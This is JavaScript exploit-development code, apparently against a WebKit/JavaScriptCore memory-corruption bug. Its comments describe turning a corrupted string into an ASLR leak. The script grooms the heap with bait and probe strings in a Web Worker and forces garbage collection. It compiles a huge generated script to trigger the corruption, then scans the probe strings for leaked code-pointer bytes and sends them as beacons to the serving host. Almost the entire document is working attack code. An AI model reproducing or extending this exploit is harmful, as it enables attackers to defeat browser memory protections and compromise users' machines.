// p390 - THOROUGH character data scan for sweep residue in corrupted StringImpl
//
// The sweep writes metadata entries (112-byte stride) through the StringImpl's
// inline character data. Each entry writes specific fields:
//   entry+12: 0xFFFFFFFF (4 bytes)
//   entry+24: thunk CODE POINTER (8 bytes) -- ASLR leak if readable!
//   entry+64: bit fields (4 bytes)
//   entry+68: bytecodeIndex (4 bytes)
//
// If these writes land in the character data, charCodeAt at those positions
// returns non-'A' values: the thunk pointer bytes = ASLR defeat.
//
// V377 reported all chars as 'A' but may have had scan issues.
// V390 does a THOROUGH scan: check every character, report first 30 non-'A'
// positions with hex values. Also scan at 112-byte stride offsets specifically.
//
// Beacon prefix: V390-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V390-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {
      try { new Image().src = '/beacon/V390-' + tag + '?t=' + Date.now(); } catch(e2) {}
    }
  }

  B('BOOT');

  var workerCode = function() {
    var baits = [];
    var probes = [];
    var baseUrl = '';

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V390-W-' + tag + '?t=' + Date.now(), false);
        x.send('');
      } catch(e) {}
    }
    function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    function makeStr(len, ch) {
      var s = '';
      for (var i = 0; i < 100; i++) s += ch;
      var reps = Math.ceil(len / 100);
      var result = '';
      for (var i = 0; i < reps; i++) result += s;
      result = result.substring(0, len);
      result.charCodeAt(0);
      return result;
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') { baseUrl = e.data.baseUrl; beacon('ALIVE'); return; }

      if (e.data.cmd === 'alloc') {
        // 20 baits + 10 probes, all 100000 chars of 'A'
        for (var i = 0; i < 20; i++) baits.push(makeStr(100000, 'A'));
        beacon('BAITS-' + baits.length);
        for (var i = 0; i < 10; i++) probes.push(makeStr(100000, 'A'));
        beacon('PROBES-' + probes.length);

        // Free baits
        for (var i = 0; i < baits.length; i++) baits[i] = null;
        baits = [];
        beacon('FREED');
        self.postMessage({ ready: true });
        return;
      }

      if (e.data.cmd === 'scan') {
        beacon('SCANNING');
        var totalNonA = 0;
        var probesTruncated = 0;
        var probesIntact = 0;

        for (var pi = 0; pi < probes.length; pi++) {
          try {
            var s = probes[pi];
            var len = s.length;

            if (len === 100000) {
              probesIntact++;
              continue;
            }

            probesTruncated++;
            beacon('P' + pi + '-LEN-' + len);

            // THOROUGH SCAN: check EVERY character for non-'A' values
            var nonA = [];
            var scanLimit = Math.min(len, 80000); // cap scan time
            for (var j = 0; j < scanLimit; j++) {
              var c = s.charCodeAt(j);
              if (c !== 0x41) { // not 'A'
                nonA.push(j);
                if (nonA.length <= 30) {
                  // Report position and value
                  beacon('P' + pi + '-NONA-' + j + '-' + hexByte(c & 0xFF));
                }
              }
            }

            beacon('P' + pi + '-SCAN-' + scanLimit + '-NONA-' + nonA.length);

            if (nonA.length > 0) {
              totalNonA += nonA.length;

              // Check for stride pattern: are non-A positions at 112-byte intervals?
              if (nonA.length >= 2) {
                var diffs = [];
                for (var k = 1; k < Math.min(nonA.length, 10); k++) {
                  diffs.push(nonA[k] - nonA[k-1]);
                }
                beacon('P' + pi + '-DIFFS-' + diffs.join(','));
              }

              // Read 8 bytes at the first few non-A positions (potential thunk pointers)
              for (var k = 0; k < Math.min(nonA.length, 5); k++) {
                var pos = nonA[k];
                var hex8 = '';
                for (var b = 0; b < 8 && (pos + b) < len; b++) {
                  hex8 += hexByte(s.charCodeAt(pos + b) & 0xFF);
                }
                beacon('P' + pi + '-BYTES-' + pos + '-' + hex8);
              }
            }

            // Also specifically check at 112-byte stride from the start
            // These are where sweep entries should write
            var strideHits = 0;
            for (var stride = 0; stride < scanLimit; stride += 112) {
              // Check offsets +12, +24, +64, +68 within each stride
              var offsets = [12, 24, 25, 26, 27, 28, 29, 30, 31, 64, 65, 66, 67, 68, 69, 70, 71];
              for (var oi = 0; oi < offsets.length; oi++) {
                var idx = stride + offsets[oi];
                if (idx < len) {
                  var c2 = s.charCodeAt(idx);
                  if (c2 !== 0x41) {
                    strideHits++;
                    if (strideHits <= 10) {
                      beacon('P' + pi + '-STRIDE-' + idx + '-' + hexByte(c2 & 0xFF));
                    }
                  }
                }
              }
            }
            beacon('P' + pi + '-STRIDEHITS-' + strideHits);

          } catch(ex) {
            beacon('P' + pi + '-CRASH-' + (ex.message || '').substring(0, 30));
          }
        }

        beacon('SUMMARY-TRUNC' + probesTruncated + '-INTACT' + probesIntact + '-NONA' + totalNonA);
        beacon('ALL-DONE');
        self.postMessage({ done: true });
      }
    };
  };

  var workerBlob = new Blob(['(' + workerCode.toString() + ')()'], { type: 'application/javascript' });
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: location.protocol + '//' + location.host });

  worker.onmessage = function(e) {
    if (e.data.ready) {
      B('WORKER-READY');
      var gcR = 0;
      function gc() {
        for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
        for (var j = 0; j < 500; j++) new Array(100).fill(gcR);
        gcR++;
        if (gcR < 30) setTimeout(gc, 30);
        else { B('GC-' + gcR); build(); }
      }
      gc();
    }
    if (e.data.done) {
      B('WORKER-SCAN-DONE');
    }
  };

  worker.postMessage({ cmd: 'alloc' });

  function build() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var cc = 'a();'.repeat(CHUNK);
    var p = ['window.__p390fn=function(a){'];
    for (var c = 0; c < nC; c++) p.push(cc);
    p.push('a();'.repeat(rem));
    p.push('};window.__p390ok=true;');
    cc = null;
    var blob = new Blob(p, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    p = null;
    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-' + (window.__p390ok ? 'OK' : 'FAIL'));
      worker.postMessage({ cmd: 'scan' });
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
